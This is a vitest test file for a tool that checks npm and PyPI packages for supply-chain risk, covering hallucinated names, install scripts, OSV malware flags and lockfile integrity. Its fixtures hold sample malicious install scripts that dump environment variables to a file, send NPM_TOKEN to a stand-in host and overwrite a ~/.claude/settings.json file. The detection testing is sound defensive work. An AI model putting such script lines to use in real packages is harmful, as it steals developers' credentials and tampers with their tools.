import { describe, expect, it } from "vitest";
import { checkPackage } from "./check.js";
import { LockfileIndex } from "./lockfile.js";
import { buildTopList } from "./similarity/index.js";
import { staticAtlas } from "./sources/atlas.js";
import { SourceError } from "./sources/http.js";
import type { NpmPackageInfo, NpmSource } from "./sources/npm.js";
import type { OsvSource } from "./sources/osv.js";
import type { PypiSource } from "./sources/pypi.js";
import { daysAgo, hoursAgo, makeTgz, NOW } from "./test/helpers.js";

const tops = { npm: buildTopList("npm", ["react", "express", "lodash", "jscodeshift"]), pypi: buildTopList("pypi", ["requests"]) };

function npmFake(pk: Record<string, NpmPackageInfo>, tgz: Record<string, Uint8Array> = {}, dl: Record<string, number> = {}): NpmSource {
  return {
    packument: async (n) => pk[n] ?? null,
    weeklyDownloads: async (n) => dl[n] ?? 0,
    tarball: async (u) => tgz[u] ?? null,
  };
}
const osvClean: OsvSource = { query: async () => ({ malicious: [], vulns: [] }) };
const pypiNone: PypiSource = { project: async () => null, weeklyDownloads: async () => 0, sdist: async () => null };

const canaryInfo: NpmPackageInfo = {
  name: "color-fn-utils",
  created: daysAgo(2),
  distTags: { latest: "1.0.2" },
  versions: {
    "1.0.2": { version: "1.0.2", time: daysAgo(2), maintainers: ["x"], provenance: false, scripts: { postinstall: "node scripts/postinstall.js" }, gypfile: false, tarball: "t://c" },
  },
};
const canaryTgz = makeTgz({ "package/scripts/postinstall.js": "require('http').get('http://127.0.0.1');require('fs').writeFileSync('/tmp/x', JSON.stringify(process.env))" });

const expressInfo: NpmPackageInfo = {
  name: "express",
  created: daysAgo(5000),
  distTags: { latest: "5.1.0" },
  versions: {
    "4.21.0": { version: "4.21.0", time: daysAgo(400), maintainers: ["wesleytodd"], provenance: false, scripts: {}, gypfile: false, repositoryUrl: "git+https://github.com/expressjs/express.git" },
    "5.1.0": { version: "5.1.0", time: daysAgo(200), maintainers: ["wesleytodd"], provenance: false, scripts: {}, gypfile: false, repositoryUrl: "git+https://github.com/expressjs/express.git" },
  },
};

const deps = (npm: NpmSource, extra: object = {}) => ({ npm, pypi: pypiNone, osv: osvClean, topLists: tops, now: () => NOW, ...extra });

describe("checkPackage", () => {
  it("holds the canary (new + install script + env + network + low downloads)", async () => {
    const r = await checkPackage({ ecosystem: "npm", name: "color-fn-utils" }, deps(npmFake({ "color-fn-utils": canaryInfo }, { "t://c": canaryTgz })));
    expect(r.verdict).toBe("hold");
    expect(r.version).toBe("1.0.2");
    expect(r.hits.map((h) => h.id)).toEqual(expect.arrayContaining(["R06", "R08", "R09", "R10", "R12", "R13"]));
    expect(r.score).toBe(100);
  });

  it("allows a popular, old, script-less package", async () => {
    const r = await checkPackage({ ecosystem: "npm", name: "express", versionSpec: "^4" }, deps(npmFake({ express: expressInfo }, {}, { express: 40_000_000 })));
    expect(r).toMatchObject({ verdict: "allow", score: 0, version: "4.21.0" });
  });

  it("not found → hold override, enriched with Atlas", async () => {
    const atlas = staticAtlas([{ ecosystem: "npm", name: "react-codeshift", models: ["m1", "m2"], seenCount: 4, registeredAt: null }]);
    const r = await checkPackage({ ecosystem: "npm", name: "react-codeshift" }, deps(npmFake({}), { atlas }));
    expect(r.verdict).toBe("hold");
    expect(r.hits[0]!.id).toBe("R01");
    expect(r.hits.map((h) => h.id)).toContain("R03");
  });

  it("existing hallucinated, freshly registered conflation gets R03 bonus + R05", async () => {
    const atlas = staticAtlas([{ ecosystem: "npm", name: "react-codeshift", models: ["a", "b", "c", "d"], seenCount: 9, registeredAt: daysAgo(3) }]);
    const info: NpmPackageInfo = { name: "react-codeshift", created: daysAgo(3), distTags: { latest: "0.0.1" }, versions: { "0.0.1": { version: "0.0.1", time: daysAgo(3), maintainers: ["z"], provenance: false, scripts: {}, gypfile: false } } };
    const r = await checkPackage({ ecosystem: "npm", name: "react-codeshift" }, deps(npmFake({ "react-codeshift": info }), { atlas }));
    expect(r.verdict).toBe("hold");
    const ids = r.hits.map((h) => h.id);
    expect(ids).toEqual(expect.arrayContaining(["R03", "R05", "R06"]));
    expect(r.hits.find((h) => h.id === "R03")!.weight).toBe(55);
  });

  it("OSV MAL- → hold override", async () => {
    const osv: OsvSource = { query: async () => ({ malicious: ["MAL-2026-1234"], vulns: [] }) };
    const r = await checkPackage({ ecosystem: "npm", name: "express" }, deps(npmFake({ express: expressInfo }, {}, { express: 1e7 }), { osv }));
    expect(r).toMatchObject({ verdict: "hold", score: 100 });
  });

  it("fails closed when the registry is unreachable", async () => {
    const npm: NpmSource = { packument: async () => { throw new SourceError("npm registry", "cannot reach registry.npmjs.org (TimeoutError)"); }, weeklyDownloads: async () => 0, tarball: async () => null };
    const r = await checkPackage({ ecosystem: "npm", name: "express" }, deps(npm));
    expect(r.verdict).toBe("hold");
    expect(r.hits[0]!.id).toBe("E01");
    const open = await checkPackage({ ecosystem: "npm", name: "express" }, deps(npm), { failMode: "open" });
    expect(open.verdict).toBe("allow");
  });

  it("lockfile fast path", async () => {
    const lock = new LockfileIndex();
    lock.add("npm", "color-fn-utils", "1.0.2");
    let called = false;
    const npm: NpmSource = { packument: async () => { called = true; return null; }, weeklyDownloads: async () => 0, tarball: async () => null };
    const r = await checkPackage({ ecosystem: "npm", name: "color-fn-utils", versionSpec: "1.0.2" }, deps(npm), { lockfile: lock });
    expect(r).toMatchObject({ verdict: "allow", fastPath: "lockfile" });
    expect(called).toBe(false);
  });

  it("lockfile fast path verifies integrity against the registry", async () => {
    const sri = "sha512-" + "A".repeat(86) + "==";
    const info: NpmPackageInfo = { ...canaryInfo, versions: { "1.0.2": { ...canaryInfo.versions["1.0.2"]!, integrity: sri } } };
    const lock = new LockfileIndex();
    lock.add("npm", "color-fn-utils", "1.0.2", sri);
    const ok = await checkPackage({ ecosystem: "npm", name: "color-fn-utils", versionSpec: "^1.0.0" }, deps(npmFake({ "color-fn-utils": info })), { lockfile: lock });
    expect(ok).toMatchObject({ verdict: "allow", fastPath: "lockfile", version: "1.0.2" });
    expect(ok.evidence.lockfile.integrity).toBe("verified");

    const tampered = new LockfileIndex();
    tampered.add("npm", "color-fn-utils", "1.0.2", "sha512-" + "B".repeat(86) + "==");
    const bad = await checkPackage({ ecosystem: "npm", name: "color-fn-utils", versionSpec: "1.0.2" }, deps(npmFake({ "color-fn-utils": info }, { "t://c": canaryTgz })), { lockfile: tampered });
    expect(bad.fastPath).toBeUndefined();
    expect(bad.verdict).toBe("hold");
    expect(bad.hits.find((h) => h.id === "L01")).toMatchObject({ name: "lockfile_integrity_mismatch", weight: 60 });
    expect(bad.hits.map((h) => h.id)).toContain("R09"); // full check ran

    // registry unreachable → fast path as before, but integrity is not claimed
    const down: NpmSource = { packument: async () => { throw new SourceError("npm registry", "down"); }, weeklyDownloads: async () => 0, tarball: async () => null };
    const un = await checkPackage({ ecosystem: "npm", name: "color-fn-utils", versionSpec: "1.0.2" }, deps(down), { lockfile: lock });
    expect(un).toMatchObject({ verdict: "allow", fastPath: "lockfile" });
    expect(un.evidence.lockfile.integrity).toBe("unchecked");
  });

  it("PyPI lockfile fast path: PEP 440 range + file sha256", async () => {
    const h = "a".repeat(64);
    const pypi: PypiSource = {
      project: async () => ({ name: "requests", latest: "2.32.3", releases: { "2.32.3": { version: "2.32.3", hasWheel: true, files: [{ filename: "requests-2.32.3.tar.gz", packagetype: "sdist", sha256: h }] } } }),
      weeklyDownloads: async () => 1e7,
      sdist: async () => null,
    };
    const lock = new LockfileIndex();
    lock.add("pypi", "requests", "2.32.3", `sha256:${h}`);
    const r = await checkPackage({ ecosystem: "pypi", name: "requests", versionSpec: ">=2.30,<3" }, { ...deps(npmFake({})), pypi }, { lockfile: lock });
    expect(r).toMatchObject({ verdict: "allow", fastPath: "lockfile" });
    expect(r.evidence.lockfile.integrity).toBe("verified");
    const bad = new LockfileIndex();
    bad.add("pypi", "requests", "2.32.3", `sha256:${"f".repeat(64)}`);
    const r2 = await checkPackage({ ecosystem: "pypi", name: "requests", versionSpec: "==2.32.3" }, { ...deps(npmFake({})), pypi }, { lockfile: bad });
    expect(r2.hits.map((x) => x.id)).toContain("L01");
  });

  it("worm pattern: hijacked new version of a popular package", async () => {
    const info: NpmPackageInfo = {
      ...expressInfo,
      distTags: { latest: "5.1.1" },
      versions: {
        ...expressInfo.versions,
        "5.1.1": { version: "5.1.1", time: hoursAgo(6), maintainers: ["wesleytodd", "npm-bot-x"], publisher: "npm-bot-x", provenance: false, scripts: { postinstall: "node setup.js" }, gypfile: false, tarball: "t://w", repositoryUrl: "git+https://github.com/expressjs/express.git" },
        "5.1.0": { ...expressInfo.versions["5.1.0"]!, publisher: "wesleytodd", provenance: true },
      },
    };
    const tgz = makeTgz({ "package/setup.js": "const t=process.env.NPM_TOKEN;fetch('https://x.example/'+t);require('fs').writeFileSync(require('os').homedir()+'/.claude/settings.json','{}')" });
    const r = await checkPackage({ ecosystem: "npm", name: "express" }, deps(npmFake({ express: info }, { "t://w": tgz }, { express: 4e7 })));
    expect(r.verdict).toBe("hold");
    expect(r.hits.map((h) => h.id)).toEqual(expect.arrayContaining(["R07", "R08", "R09", "R10", "R14", "R15"]));
  });
});
